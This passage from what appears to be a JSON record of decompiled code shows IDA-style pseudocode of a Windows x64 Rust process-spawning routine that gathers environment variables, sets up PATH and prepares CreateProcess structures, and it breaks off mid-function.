        "Function Body": "\nvoid __fastcall sub_14003A840(__int64 a1, __int64 a2, __int64 a3)\n{\n  __int64 v3; // rdi\n  unsigned __int64 v4; // r12\n  char *v5; // rbx\n  char v6; // al\n  __int64 v7; // r15\n  WCHAR *EnvironmentStringsW; // rax\n  unsigned __int16 *v9; // rbx\n  unsigned __int16 *v10; // r12\n  __int64 v11; // rcx\n  unsigned __int64 v12; // rdx\n  unsigned __int64 v13; // r15\n  __int64 v14; // rax\n  unsigned __int64 v15; // r13\n  unsigned __int64 v16; // r13\n  __int64 v17; // rax\n  unsigned __int64 v18; // r8\n  unsigned __int64 v19; // r12\n  __int64 v20; // r13\n  unsigned __int64 v21; // rdx\n  unsigned __int64 v22; // rcx\n  __int64 v23; // rsi\n  unsigned __int64 v24; // r15\n  __int64 v25; // rcx\n  __int64 v26; // rcx\n  __int64 v27; // rdx\n  __int64 v28; // rcx\n  __int64 v29; // r14\n  __int64 v30; // r15\n  unsigned __int64 v31; // r15\n  WCHAR *v32; // rsi\n  __int64 v33; // r12\n  const __m128i *v34; // rbx\n  __int64 v35; // rdi\n  __m128i *v36; // r12\n  char v37; // al\n  const __m128i *v38; // rdi\n  unsigned __int64 v39; // r14\n  __int64 v40; // r12\n  unsigned __int64 v41; // rbx\n  char *v42; // rax\n  __int64 v43; // rsi\n  const __m128i *v44; // rbx\n  __m128i *v45; // r12\n  char v46; // al\n  unsigned __int16 *v47; // rax\n  __int64 v48; // rcx\n  __int64 v49; // r8\n  __int64 v50; // rcx\n  __int64 v51; // rax\n  __int64 v52; // rax\n  __int64 v53; // rax\n  __int64 v54; // rax\n  __int64 v55; // rax\n  __int64 v56; // rax\n  __int64 v57; // rax\n  __int64 v58; // rcx\n  __m128i v59; // xmm0\n  __int64 v60; // rdx\n  unsigned __int64 v61; // rax\n  __int64 v62; // rcx\n  __int64 v63; // r8\n  __int64 v64; // rdx\n  __int64 v65; // rax\n  __int128 v66; // xmm0\n  __int128 v67; // xmm1\n  __int128 v68; // xmm0\n  __int128 v69; // xmm1\n  __int128 v70; // xmm0\n  __int128 v71; // xmm1\n  __m128i si128; // xmm0\n  __m128i v73; // xmm0\n  char *v74; // r12\n  void *v75; // rbx\n  char v76; // r14\n  char *v77; // rax\n  __m128i v78; // xmm0\n  int v79; // r14d\n  unsigned __int64 v80; // rcx\n  __int64 v81; // rbx\n  unsigned __int64 v82; // r13\n  int v83; // eax\n  __int64 v84; // rdi\n  WCHAR *v85; // r14\n  __m128i *v86; // rbx\n  bool (__fastcall *v87)(char); // rax\n  unsigned __int32 v88; // eax\n  bool v89; // zf\n  char v90; // si\n  __int64 v91; // rax\n  __int64 v92; // rax\n  __int64 v93; // rcx\n  bool v94; // al\n  WCHAR *v95; // rcx\n  int v96; // edx\n  __int64 v97; // rsi\n  __int16 v98; // r8\n  char *v99; // rax\n  __int16 v100; // cx\n  unsigned int v101; // edx\n  int v102; // r8d\n  int v103; // r10d\n  int v104; // edx\n  char v105; // r9\n  __m128i *v106; // rax\n  __m128i *v107; // rdi\n  unsigned __int8 *v108; // rdi\n  WCHAR *v109; // r14\n  unsigned __int64 v110; // rsi\n  _WORD *v111; // rax\n  unsigned __int64 v112; // rdx\n  char *v113; // r11\n  __int64 v114; // r8\n  _WORD *v115; // r9\n  __int64 v116; // rax\n  unsigned __int64 v117; // rcx\n  __int64 v118; // rax\n  char v119; // al\n  unsigned __int64 v120; // rsi\n  _BYTE *v121; // rax\n  unsigned __int64 v122; // rdx\n  void *v123; // rsi\n  WCHAR *v124; // r8\n  __m128i v125; // xmm6\n  __int64 v126; // r8\n  char *hThread; // rbx\n  char *v128; // rsi\n  unsigned __int64 v129; // r14\n  WCHAR *v130; // r13\n  unsigned __int64 v131; // r15\n  unsigned __int64 v132; // r8\n  UINT SystemDirectoryW; // edi\n  unsigned __int64 v134; // r15\n  void *v135; // rdi\n  char v136; // si\n  void *v137; // r14\n  __int64 v138; // rax\n  __int64 v139; // r8\n  char *v140; // rsi\n  char *v141; // rbx\n  __int64 v142; // r15\n  LPWCH v143; // r14\n  WCHAR *v144; // r13\n  unsigned __int64 v145; // r14\n  unsigned __int64 v146; // r8\n  UINT WindowsDirectoryW; // edi\n  bool v148; // cf\n  unsigned __int64 v149; // r14\n  void *v150; // rdi\n  char v151; // di\n  __int64 v152; // rax\n  unsigned __int64 v153; // r9\n  void *v154; // rsi\n  void *v155; // r14\n  char *v156; // rax\n  __m128i *v157; // r14\n  _QWORD *v158; // rsi\n  __int64 v159; // rbx\n  unsigned __int8 v160; // di\n  __int64 v161; // rcx\n  __int64 v162; // r8\n  __int64 v163; // rdx\n  _QWORD *v164; // r15\n  __int64 v165; // rdx\n  char **v166; // rbx\n  WCHAR *v167; // rax\n  __int64 v168; // rdx\n  int v169; // r15d\n  int dwCreationFlags; // r15d\n  __m128i v171; // kr40_16\n  __int64 v172; // rbx\n  __int64 v173; // r14\n  __int64 v174; // r12\n  __int64 v175; // rax\n  char v176; // si\n  __int64 v177; // rax\n  __int64 v178; // rcx\n  const WCHAR *lpCurrentDirectory; // r13\n  __int64 v180; // rax\n  unsigned __int64 v181; // rdi\n  unsigned __int64 v182; // rsi\n  __int64 v183; // rbx\n  unsigned __int64 v184; // r15\n  __m128i *v185; // r14\n  unsigned __int64 v186; // r12\n  unsigned __int64 v187; // rax\n  UINT v188; // r13d\n  unsigned __int64 v189; // r12\n  __int64 v190; // r12\n  _QWORD *v191; // rdx\n  _QWORD *v192; // rsi\n  unsigned __int64 v193; // rdi\n  char *v194; // rcx\n  __int64 v195; // rax\n  __int64 v196; // rdx\n  char v197; // r11\n  __int128 v198; // xmm0\n  __m128i v199; // xmm0\n  unsigned __int8 *v200; // rdx\n  __int16 v201; // r11\n  char *v202; // r8\n  __int16 v203; // r9\n  unsigned int v204; // r10d\n  int v205; // r11d\n  int v206; // ebx\n  int v207; // r10d\n  unsigned __int8 v208; // bl\n  __m128i *v209; // rbx\n  __int64 v210; // r8\n  __int64 v211; // r12\n  __m128i v212; // kr60_16\n  __int16 v213; // r11\n  char *v214; // r8\n  __int16 v215; // r9\n  unsigned int v216; // r10d\n  int v217; // r11d\n  int v218; // ebx\n  int v219; // r10d\n  char v220; // bl\n  __int64 v221; // r8\n  __int64 v222; // r12\n  const __m128i *v223; // rsi\n  unsigned __int64 v224; // rdx\n  __m128i *v225; // rcx\n  __int64 v226; // rcx\n  char *v227; // rax\n  char *v228; // rcx\n  __int16 v229; // r10\n  char *v230; // rdx\n  __int16 v231; // r8\n  unsigned int v232; // r9d\n  int v233; // r10d\n  int v234; // esi\n  int v235; // r9d\n  char v236; // r11\n  __int64 v237; // rcx\n  __int64 v238; // rax\n  __int64 v239; // r8\n  __int64 v240; // rax\n  __int64 v241; // rdx\n  bool v242; // si\n  __m128i *v243; // rcx\n  struct _PROC_THREAD_ATTRIBUTE_LIST *v244; // rbx\n  __int64 v245; // rdi\n  __int64 v246; // rax\n  void *v247; // rdx\n  __int64 v248; // rax\n  void *v249; // rdx\n  __int64 v250; // rax\n  __int64 v251; // rsi\n  __int64 v252; // rbx\n  char *v253; // rax\n  __int64 v254; // r13\n  __int64 v255; // r8\n  __int64 v256; // rax\n  __int64 v257; // rax\n  void *v258; // rdx\n  __int64 v259; // rax\n  __int64 v260; // rsi\n  __int64 v261; // rbx\n  char *v262; // r12\n  __int64 v263; // r8\n  unsigned int v264; // ecx\n  __int64 v265; // rax\n  __int16 v266; // r15\n  __int64 v267; // r14\n  int v268; // esi\n  unsigned int v269; // eax\n  int v270; // edx\n  int v271; // r11d\n  int v272; // r9d\n  unsigned __int64 v273; // r8\n  _QWORD *v274; // rsi\n  char *v275; // rax\n  __int64 v276; // r8\n  const char *v277; // r15\n  __int64 v278; // rdi\n  unsigned int v279; // r14d\n  int v280; // ecx\n  int v281; // r9d\n  int v282; // edx\n  __int16 v283; // r12\n  __int64 v284; // rcx\n  __int64 v285; // rdi\n  unsigned __int64 v286; // r8\n  __int64 v287; // r12\n  __int64 v288; // rdi\n  unsigned __int64 v289; // rcx\n  char **v290; // r14\n  WCHAR v291; // ax\n  unsigned __int64 v292; // rbx\n  const __m128i *v293; // r14\n  __int64 v294; // r15\n  int v295; // ecx\n  unsigned __int64 v296; // rdi\n  _QWORD *v297; // r15\n  __int64 v298; // rdx\n  unsigned __int8 v299; // r14\n  __int64 v300; // r12\n  __int64 v301; // r13\n  __int64 v302; // rdi\n  __int64 v303; // rax\n  __int64 v304; // rax\n  __int64 v305; // rdi\n  __m128i v306; // xmm0\n  struct _STARTUPINFOW *lpStartupInfo; // rax\n  WCHAR *v308; // rdi\n  LPWSTR v309; // r14\n  __int128 v310; // xmm0\n  __int128 v311; // xmm1\n  _OWORD *v312; // rax\n  unsigned __int8 v313; // di\n  __int64 v314; // rdx\n  __int64 v315; // rax\n  __int64 v316; // rcx\n  __int64 v317; // rax\n  __int64 v318; // rax\n  __int64 v319; // rax\n  void *lpEnvironment; // [rsp+88h] [rbp-50h]\n  _BYTE lpString1[64]; // [rsp+A8h] [rbp-30h] BYREF\n  __int128 v322; // [rsp+E8h] [rbp+10h]\n  __int128 v323; // [rsp+F8h] [rbp+20h]\n  __int64 v324; // [rsp+108h] [rbp+30h]\n  unsigned __int64 v325; // [rsp+110h] [rbp+38h]\n  __int64 v326; // [rsp+4B0h] [rbp+3D8h]\n  __int64 v327; // [rsp+4B8h] [rbp+3E0h]\n  __m128i v328; // [rsp+4C0h] [rbp+3E8h] BYREF\n  __int64 v329; // [rsp+4D0h] [rbp+3F8h]\n  __int64 v330; // [rsp+4D8h] [rbp+400h]\n  __m128i v331; // [rsp+4E0h] [rbp+408h]\n  __int64 v332; // [rsp+4F0h] [rbp+418h]\n  HANDLE hObject; // [rsp+4F8h] [rbp+420h]\n  LPWSTR lpCommandLine; // [rsp+500h] [rbp+428h] BYREF\n  char **v335; // [rsp+508h] [rbp+430h]\n  __int64 v336; // [rsp+510h] [rbp+438h]\n  struct _PROC_THREAD_ATTRIBUTE_LIST *v337; // [rsp+518h] [rbp+440h]\n  __int64 v338; // [rsp+520h] [rbp+448h]\n  __int64 v339; // [rsp+528h] [rbp+450h]\n  __int64 v340; // [rsp+530h] [rbp+458h]\n  HANDLE v341; // [rsp+538h] [rbp+460h]\n  HANDLE v342; // [rsp+540h] [rbp+468h]\n  _BYTE v343[48]; // [rsp+548h] [rbp+470h] BYREF\n  _BYTE v344[40]; // [rsp+578h] [rbp+4A0h]\n  struct _PROCESS_INFORMATION ProcessInformation; // [rsp+5A8h] [rbp+4D0h] BYREF\n  __m128i *v346; // [rsp+5C0h] [rbp+4E8h]\n  void *v347; // [rsp+5C8h] [rbp+4F0h]\n  __int64 v348; // [rsp+5D0h] [rbp+4F8h]\n  __m128i v349; // [rsp+5D8h] [rbp+500h] BYREF\n  int cchCount1[4]; // [rsp+5E8h] [rbp+510h]\n  _OWORD *v351; // [rsp+600h] [rbp+528h]\n  __int64 v352; // [rsp+608h] [rbp+530h]\n  LPCWSTR lpApplicationName; // [rsp+610h] [rbp+538h]\n  _OWORD v354[7]; // [rsp+618h] [rbp+540h] BYREF\n  _BYTE v355[24]; // [rsp+688h] [rbp+5B0h] BYREF\n  void *v356; // [rsp+6A0h] [rbp+5C8h]\n  char v357; // [rsp+6ADh] [rbp+5D5h]\n  char v358; // [rsp+6AEh] [rbp+5D6h]\n  char v359; // [rsp+6AFh] [rbp+5D7h]\n  LPWCH penv; // [rsp+6B0h] [rbp+5D8h]\n  char v361; // [rsp+6BDh] [rbp+5E5h]\n  char v362; // [rsp+6BEh] [rbp+5E6h]\n  char v363; // [rsp+6BFh] [rbp+5E7h]\n  __int64 hProcess; // [rsp+6C0h] [rbp+5E8h]\n  char v365; // [rsp+6CCh] [rbp+5F4h]\n  char v366; // [rsp+6CFh] [rbp+5F7h]\n  __int64 v367; // [rsp+6D0h] [rbp+5F8h]\n\n  v367 = -2i64;\n  v337 = (struct _PROC_THREAD_ATTRIBUTE_LIST *)a3;\n  v351 = (_OWORD *)a1;\n  v5 = *(char **)(a2 + 96);\n  v348 = a2;\n  v6 = *(_BYTE *)(a2 + 104);\n  if ( !v6 && !v5 )\n  {\n    v330 = 0i64;\n    v7 = 0i64;\n    goto LABEL_125;\n  }\n  *(_QWORD *)v355 = 0i64;\n  *(_QWORD *)&v355[16] = 0i64;\n  if ( !v6 )\n  {\n    hProcess = (__int64)v5;\n    EnvironmentStringsW = GetEnvironmentStringsW();\n    if ( !EnvironmentStringsW )\n    {\n      LODWORD(v319) = GetLastError();\n      *(_QWORD *)v343 = (v319 << 32) | 2;\n      *(_QWORD *)&v354[0] = v343;\n      *((_QWORD *)&v354[0] + 1) = sub_140032FF0;\n      *(_QWORD *)lpString1 = &off_14006C558;\n      *(_QWORD *)&lpString1[8] = 1i64;\n      *(_QWORD *)&lpString1[32] = 0i64;\n      *(_QWORD *)&lpString1[16] = v354;\n      *(_QWORD *)&lpString1[24] = 1i64;\n      sub_14005DD00((__int64)lpString1, (__int64)&off_14006C568);\n    }\n    v3 = (__int64)v343;\n    penv = EnvironmentStringsW;\n    v9 = EnvironmentStringsW;\nLABEL_7:\n    while ( *v9 )\n    {\n      v10 = v9;\n      v11 = -2i64;\n      v12 = 0i64;\n      do\n      {\n        v13 = v12;\n        v14 = v11;\n        ++v12;\n        v11 += 2i64;\n      }\n      while ( v9[v13] );\n      v9 += v12;\n      if ( v13 != 1 )\n      {\n        if ( !v13 )\n          sub_14005DD40(1i64, 0i64, (__int64)&off_14006C518);\n        v15 = 0i64;\n        while ( v10[v15 + 1] != 61 )\n        {\n          ++v15;\n          v14 -= 2i64;\n          if ( !v14 )\n            goto LABEL_7;\n        }\n        if ( v15 >= v13 )\n          sub_14005DE40(v15 + 1, v13, (__int64)&off_14006C4E8);\n        sub_1400308F0((__int128 *)v349.m128i_i8, v10, v15 + 1);\n        v16 = v15 + 2;\n        if ( v13 < v16 )\n          sub_14005DD40(v16, v13, (__int64)&off_14006C500);\n        sub_1400308F0((__int128 *)v343, &v10[v16], v13 - v16);\n        *(_OWORD *)&lpString1[16] = *(_OWORD *)cchCount1;\n        *(__m128i *)lpString1 = v349;\n        *(_OWORD *)&lpString1[48] = *(_OWORD *)&v343[16];\n        *(_OWORD *)&lpString1[32] = *(_OWORD *)v343;\n        v354[0] = _mm_load_si128((const __m128i *)lpString1);\n        v354[1] = *(_OWORD *)cchCount1;\n        v354[2] = *(_OWORD *)v343;\n        v354[3] = *(_OWORD *)&v343[16];\n        if ( LOBYTE(cchCount1[2]) == 2 )\n          break;\n        *(_QWORD *)v343 = *(_QWORD *)&v354[0];\n        *(_QWORD *)&v343[8] = *(_QWORD *)&v354[0] + *(_QWORD *)&v354[1];\n        *(_WORD *)&v343[16] = 0;\n        sub_14003F040((__int64)&v349, (char **)v343);\n        *(_OWORD *)&lpString1[40] = v354[1];\n        *(_OWORD *)&lpString1[24] = v354[0];\n        *(__m128i *)lpString1 = _mm_loadu_si128(&v349);\n        *(_QWORD *)&lpString1[16] = *(_QWORD *)cchCount1;\n        v359 = 0;\n        sub_14003F260((__int64)v343, (__int64 *)v355, (__int64)lpString1, &v354[2]);\n        if ( v343[24] != 2 && *(_QWORD *)&v343[8] )\n          sub_1400015D0(*(void **)v343, 1ui64);\n      }\n    }\n    FreeEnvironmentStringsW(penv);\n    v5 = (char *)hProcess;\n  }\n  v17 = *(_QWORD *)(v348 + 80);\n  v18 = *(_QWORD *)(v348 + 88);\n  v19 = v17 != 0;\n  if ( !v17 )\n    v5 = 0i64;\n  v20 = 0i64;\n  while ( v5 )\n  {\n    if ( !v19 || v20 )\n    {\n      if ( !v19 )\n        sub_14005DEC0(\n          (__int64)\"called `Option::unwrap()` on a `None` valueC:\\\\Users\\\\root\\\\.cargo\\\\registry\\\\src\\\\index.crates.io-6f\"\n                   \"17d22bba15001f\\\\winapi-util-0.1.5\\\\src\\\\win.rs\",\n          43i64,\n          (__int64)&off_140069C90);\n      goto LABEL_42;\n    }\n    v19 = 1i64;\n    if ( v18 )\n    {\n      v21 = v18 & 7;\n      if ( (v18 & 7) != 0 )\n      {\n        v22 = v18 & 0xFFFFFFFFFFFFFFF8ui64;\n        v20 = v17;\n        do\n        {\n          v20 = *(_QWORD *)(v20 + 984);\n          --v21;\n        }\n        while ( v21 );\n        if ( v18 < 8 )\n          goto LABEL_41;\n        do\n        {\nLABEL_40:\n          v20 = *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(*(_QWORD *)(*(_QWORD *)(*(_QWORD *)(*(_QWORD *)(*(_QWORD *)(v20 + 984)\n                                                                                                  + 984i64)\n                                                                                      + 984i64)\n                                                                          + 984i64)\n                                                              + 984i64)\n                                                  + 984i64)\n                                      + 984i64)\n                          + 984i64);\n          v22 -= 8i64;\n        }\n        while ( v22 );\n        goto LABEL_41;\n      }\n      v20 = v17;\n      v22 = v18;\n      if ( v18 >= 8 )\n        goto LABEL_40;\n    }\n    else\n    {\n      v20 = v17;\n    }\nLABEL_41:\n    v18 = 0i64;\n    v17 = 0i64;\nLABEL_42:\n    v23 = v20;\n    v24 = v18;\n    if ( v18 >= *(unsigned __int16 *)(v20 + 978) )\n    {\n      do\n      {\n        v25 = *(_QWORD *)(v23 + 352);\n        if ( !v25 )\n          sub_14005DEC0(\n            (__int64)\"called `Option::unwrap()` on a `None` valueC:\\\\Users\\\\root\\\\.cargo\\\\registry\\\\src\\\\index.crates.io-\"\n                     \"6f17d22bba15001f\\\\winapi-util-0.1.5\\\\src\\\\win.rs\",\n            43i64,\n            (__int64)&off_14006A778);\n        v24 = *(unsigned __int16 *)(v23 + 976);\n        ++v17;\n        v23 = *(_QWORD *)(v23 + 352);\n      }\n      while ( (unsigned __int16)v24 >= *(_WORD *)(v25 + 978) );\n    }\n    if ( v17 )\n    {\n      v20 = *(_QWORD *)(v23 + 8 * v24 + 992);\n      v26 = v17 - 1;\n      if ( v17 != 1 )\n      {\n        v27 = v26 & 7;\n        if ( (v26 & 7) != 0 )\n        {\n          v28 = v26 & 7;\n          do\n          {\n            v20 = *(_QWORD *)(v20 + 984);\n            --v28;\n          }\n          while ( v28 );\n          v26 = v17 + ~v27;\n        }\n        if ( (unsigned __int64)(v17 - 2) >= 7 )\n        {\n          do\n          {\n            v20 = *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(*(_QWORD *)(*(_QWORD *)(*(_QWORD *)(*(_QWORD *)(*(_QWORD *)(v20 + 984) + 984i64)\n                                                                                        + 984i64)\n                                                                            + 984i64)\n                                                                + 984i64)\n                                                    + 984i64)\n                                        + 984i64)\n                            + 984i64);\n            v26 -= 8i64;\n          }\n          while ( v26 );\n        }\n      }\n      v18 = 0i64;\n    }\n    else\n    {\n      v18 = v24 + 1;\n      v20 = v23;\n    }\n    --v5;\n    v29 = v23 + 56 * v24 + 360;\n    v30 = 32 * v24;\n    if ( *(_BYTE *)(v23 + v30 + 24) == 2 )\n    {\n      v3 = *(_QWORD *)v355;\n      v17 = 0i64;\n      if ( *(_QWORD *)v355 )\n      {\n        v31 = v18;\n        v32 = (WCHAR *)v19;\n        v33 = *(_QWORD *)&v355[8];\n        sub_140040950(\n          (__int64)&v349,\n          *(__int64 *)v355,\n          *(__int64 *)&v355[8],\n          *(const WCHAR **)v29,\n          *(_QWORD *)(v29 + 16));\n        if ( v349.m128i_i64[0] )\n        {\n          v17 = 0i64;\n          v19 = (unsigned __int64)v32;\n          v18 = v31;\n        }\n        else\n        {\n          v328.m128i_i8[0] = 0;\n          if ( *(_QWORD *)cchCount1 )\n          {\n            v47 = *(unsigned __int16 **)(v349.m128i_i64[1] + 8i64 * *(_QWORD *)&cchCount1[2] + 984);\n            v48 = *(_QWORD *)cchCount1 - 1i64;\n            if ( *(_QWORD *)cchCount1 != 1i64 )\n            {\n              v49 = v48 & 7;\n              if ( (v48 & 7) != 0 )\n              {\n                v50 = v48 & 7;\n                do\n                {\n                  v47 = *(unsigned __int16 **)&v47[4 * v47[489] + 492];\n                  --v50;\n                }\n                while ( v50 );\n                v48 = *(_QWORD *)cchCount1 + ~v49;\n              }\n              if ( (unsigned __int64)(*(_QWORD *)cchCount1 - 2i64) >= 7 )\n              {\n                do\n                {\n                  v51 = *(_QWORD *)&v47[4 * v47[489] + 492];\n                  v52 = *(_QWORD *)(v51 + 8i64 * *(unsigned __int16 *)(v51 + 978) + 984);\n                  v53 = *(_QWORD *)(v52 + 8i64 * *(unsigned __int16 *)(v52 + 978) + 984);\n                  v54 = *(_QWORD *)(v53 + 8i64 * *(unsigned __int16 *)(v53 + 978) + 984);\n                  v55 = *(_QWORD *)(v54 + 8i64 * *(unsigned __int16 *)(v54 + 978) + 984);\n                  v56 = *(_QWORD *)(v55 + 8i64 * *(unsigned __int16 *)(v55 + 978) + 984);\n                  v57 = *(_QWORD *)(v56 + 8i64 * *(unsigned __int16 *)(v56 + 978) + 984);\n                  v47 = *(unsigned __int16 **)(v57 + 8i64 * *(unsigned __int16 *)(v57 + 978) + 984);\n                  v48 -= 8i64;\n                }\n                while ( v48 );\n              }\n            }\n            v58 = v47[489] - 1i64;\n            ProcessInformation.hProcess = v47;\n            ProcessInformation.hThread = 0i64;\n            *(_QWORD *)&ProcessInformation.dwProcessId = v58;\n            sub_140040AF0((__int64)lpString1, (__int64 *)&ProcessInformation, &v328);\n            *(_QWORD *)&v344[32] = v323;\n            *(_OWORD *)&v344[16] = v322;\n            v59 = _mm_loadu_si128((const __m128i *)lpString1);\n            *(_OWORD *)v344 = *(_OWORD *)&lpString1[48];\n            *(_OWORD *)&v343[32] = *(_OWORD *)&lpString1[32];\n            *(_OWORD *)&v343[16] = *(_OWORD *)&lpString1[16];\n            *(__m128i *)v343 = v59;\n            v60 = *((_QWORD *)&v323 + 1);\n            v61 = v325;\n            if ( v325 >= *(unsigned __int16 *)(*((_QWORD *)&v323 + 1) + 978i64) )\n            {\n              v63 = v324;\n              while ( 1 )\n              {\n                v62 = *(_QWORD *)(v60 + 352);\n                if ( !v62 )\n                  break;\n                v61 = *(unsigned __int16 *)(v60 + 976);\n                ++v63;\n                v60 = *(_QWORD *)(v60 + 352);\n                if ( (unsigned __int16)v61 < *(_WORD *)(v62 + 978) )\n                  goto LABEL_94;\n              }\n              v61 = v63;\n              v62 = 0i64;\n            }\n            else\n            {\n              v62 = *((_QWORD *)&v323 + 1);\n            }\nLABEL_94:\n            v64 = 56 * v61;\n            v65 = 32 * v61;\n            *(_QWORD *)&v354[3] = *(_QWORD *)(v62 + v64 + 408);\n            v66 = *(_OWORD *)(v62 + v64 + 360);\n            v67 = *(_OWORD *)(v62 + v64 + 376);\n            v354[2] = *(_OWORD *)(v62 + v64 + 392);\n            v354[1] = v67;\n            v354[0] = v66;\n            *(_QWORD *)(v62 + v64 + 408) = *(_QWORD *)v344;\n            v68 = *(_OWORD *)v343;\n            v69 = *(_OWORD *)&v343[16];\n            *(_OWORD *)(v62 + v64 + 392) = *(_OWORD *)&v343[32];\n            *(_OWORD *)(v62 + v64 + 376) = v69;\n            *(_OWORD *)(v62 + v64 + 360) = v68;\n            v70 = *(_OWORD *)(v62 + v65);\n            *(_OWORD *)((char *)&v354[4] + 8) = *(_OWORD *)(v62 + v65 + 16);\n            *(_OWORD *)((char *)&v354[3] + 8) = v70;\n            v71 = *(_OWORD *)&v344[24];\n            *(_OWORD *)(v62 + v65) = *(_OWORD *)&v344[8];\n            *(_OWORD *)(v62 + v65 + 16) = v71;\n            *(_QWORD *)&v323 = *(_QWORD *)&v354[5];\n            v322 = v354[4];\n            si128 = _mm_load_si128((const __m128i *)v354);\n            *(_OWORD *)&lpString1[48] = v354[3];\n            *(_OWORD *)&lpString1[32] = v354[2];\n            *(_OWORD *)&lpString1[16] = v354[1];\n            *(__m128i *)lpString1 = si128;\n          }\n          else\n          {\n            v354[0] = v349.m128i_u64[1];\n            *(_QWORD *)&v354[1] = *(_QWORD *)&cchCount1[2];\n            sub_140040AF0((__int64)lpString1, (__int64 *)v354, &v328);\n          }\n          *(_QWORD *)&v354[5] = v323;\n          v354[4] = v322;\n          v73 = _mm_load_si128((const __m128i *)lpString1);\n          v354[3] = *(_OWORD *)&lpString1[48];\n          v354[2] = *(_OWORD *)&lpString1[32];\n          --*(_QWORD *)&v355[16];\n          v354[1] = *(_OWORD *)&lpString1[16];\n          v354[0] = v73;\n          if ( v328.m128i_i8[0] )\n          {\n            if ( !v33 )\n              sub_14005DEC0((__int64)\"assertion failed: self.height > 0\", 33i64, (__int64)&off_14006A440);\n            *(_QWORD *)v355 = *(_QWORD *)(v3 + 984);\n            *(_QWORD *)&v355[8] = v33 - 1;\n            *(_QWORD *)(*(_QWORD *)v355 + 352i64) = 0i64;\n            sub_1400015D0((void *)v3, 8ui64);\n          }\n          v17 = 0i64;\n          v19 = (unsigned __int64)v32;\n          v18 = v31;\n          if ( LOBYTE(v354[3]) != 2 )\n          {\n            v74 = v5;\n            v3 = *((_QWORD *)&v354[0] + 1);\n            v75 = *(void **)&v354[0];\n            v356 = (void *)*((_QWORD *)&v354[3] + 1);\n            hProcess = *(_QWORD *)&v354[4];\n            v76 = v354[5];\n            if ( *(_QWORD *)&v354[2] )\n            {\n              sub_1400015D0(*((void **)&v354[1] + 1), 1ui64);\n              v18 = v31;\n            }\n            if ( v3 )\n            {\n              sub_1400015D0(v75, 2ui64);\n              v18 = v31;\n            }\n            v17 = 0i64;\n            v5 = v74;\n            v19 = (unsigned __int64)v32;\n            if ( v76 != 2 )\n            {\n              v17 = 0i64;\n              if ( hProcess )\n              {\n                sub_1400015D0(v356, 1ui64);\n                v18 = v31;\n                v17 = 0i64;\n              }\n            }\n          }\n        }\n      }\n    }\n    else\n    {\n      hProcess = (__int64)v5;\n      v34 = *(const __m128i **)(v29 + 24);\n      v35 = *(_QWORD *)(v29 + 40);\n      penv = (LPWCH)v19;\n      v352 = v18;\n      if ( v35 )\n      {\n        if ( v35 < 0 )\n          sub_140001620();\n        v36 = (__m128i *)sub_140001540(v35, 1ui64);\n        if ( !v36 )\n          sub_14005DBB0(1i64, v35);\n      }\n      else\n      {\n        v36 = (__m128i *)1;\n      }\n      sub_14005D0A0(v36, v34, v35);\n      v37 = *(_BYTE *)(v29 + 48);\n      *(_QWORD *)&v354[0] = v36;\n      *((_QWORD *)&v354[0] + 1) = v35;\n      *(_QWORD *)&v354[1] = v35;\n      BYTE8(v354[1]) = v37;\n      v38 = *(const __m128i **)v29;\n      v39 = *(_QWORD *)(v29 + 16);\n      v40 = 2i64;\n      if ( !v39 )\n        goto LABEL_69;\n      if ( v39 >> 62 )\n        sub_140001620();\n      v41 = 2 * v39;\n      if ( 2 * v39 )\n      {\n        v42 = sub_140001540(2 * v39, 2ui64);\n        if ( !v42 )\n          sub_14005DBB0(2i64, 2 * v39);\n        v40 = (__int64)v42;\n      }\n      else\n      {\nLABEL_69:\n        v41 = 0i64;\n      }\n      v43 = v30 + v23;\n      sub_14005D0A0((__m128i *)v40, v38, v41);\n      *(__m128i *)&lpString1[24] = _mm_loadu_si128((const __m128i *)v354);\n      *(_OWORD *)&lpString1[40] = v354[1];\n      *(_QWORD *)lpString1 = v40;\n      *(_QWORD *)&lpString1[8] = v39;\n      *(_QWORD *)&lpString1[16] = v39;\n      v44 = *(const __m128i **)v43;\n      v3 = *(_QWORD *)(v43 + 16);\n      if ( v3 )\n      {\n        if ( v3 < 0 )\n        {\n          v361 = 1;\n          sub_140001620();\n        }\n        v45 = (__m128i *)sub_140001540(*(_QWORD *)(v43 + 16), 1ui64);\n        if ( !v45 )\n        {\n          v361 = 1;\n          sub_14005DBB0(1i64, v3);\n        }\n      }\n      else\n      {\n        v45 = (__m128i *)1;\n      }\n      sub_14005D0A0(v45, v44, v3);\n      v46 = *(_BYTE *)(v43 + 24);\n      *(_QWORD *)&v354[0] = v45;\n      *((_QWORD *)&v354[0] + 1) = v3;\n      *(_QWORD *)&v354[1] = v3;\n      BYTE8(v354[1]) = v46;\n      v361 = 0;\n      sub_14003F260((__int64)v343, (__int64 *)v355, (__int64)lpString1, v354);\n      v5 = (char *)hProcess;\n      v19 = (unsigned __int64)penv;\n      if ( v343[24] != 2 && *(_QWORD *)&v343[8] )\n        sub_1400015D0(*(void **)v343, 1ui64);\n      v17 = 0i64;\n      v18 = v352;\n    }\n  }\n  v332 = *(_QWORD *)&v355[16];\n  v331 = _mm_loadu_si128((const __m128i *)v355);\n  v330 = 1i64;\n  v77 = sub_140001540(4ui64, 1ui64);\n  if ( !v77 )\n  {\n    v366 = 1;\n    sub_14005DBB0(1i64, 4i64);\n  }\n  *(_DWORD *)v77 = 1213481296;\n  *(_QWORD *)&v354[0] = v77;\n  *((_QWORD *)&v354[0] + 1) = 4i64;\n  *(_QWORD *)&v354[1] = 4i64;\n  BYTE8(v354[1]) = 0;\n  *(_QWORD *)v343 = v77;\n  *(_QWORD *)&v343[8] = v77 + 4;\n  *(_WORD *)&v343[16] = 0;\n  sub_14003F040((__int64)&v349, (char **)v343);\n  *(_OWORD *)&lpString1[40] = v354[1];\n  *(_OWORD *)&lpString1[24] = v354[0];\n  v78 = _mm_loadu_si128(&v349);\n  *(__m128i *)lpString1 = v78;\n  v79 = cchCount1[0];\n  *(_QWORD *)&lpString1[16] = *(_QWORD *)cchCount1;\n  v4 = v331.m128i_i64[0];\n  if ( v331.m128i_i64[0] )\n  {\n    hProcess = v331.m128i_i64[1];\n    while ( 2 )\n    {\n      v80 = v4 + 360;\n      penv = (LPWCH)*(unsigned __int16 *)(v4 + 978);\n      v81 = 56i64 * (_QWORD)penv;\n      v3 = -1i64;\n      do\n      {\n        if ( !v81 )\n        {\n          v3 = (__int64)penv;\n          goto LABEL_115;\n        }\n        v82 = v80 + 56;\n        v83 = 